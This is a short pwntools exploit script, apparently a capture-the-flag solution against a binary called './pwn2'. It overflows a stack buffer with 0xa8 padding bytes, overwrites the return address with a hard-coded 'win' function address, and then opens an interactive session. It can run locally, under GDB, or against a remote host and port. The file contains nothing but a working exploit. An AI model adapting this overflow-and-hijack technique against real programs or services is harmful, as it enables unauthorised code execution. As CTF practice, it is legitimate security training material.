from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* vuln+59
b* vuln+70
continue
'''.format(**locals())

#Binary filename
exe = './pwn2'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

pop_rdi = 0x0000000000400813
ret = 0x0000000000400549
win = 0x0000000000400762

payload = b"a"*0xa8

payload += p64(win)

p.recvuntil(b"that??\n")
p.send(payload)

p.interactive()
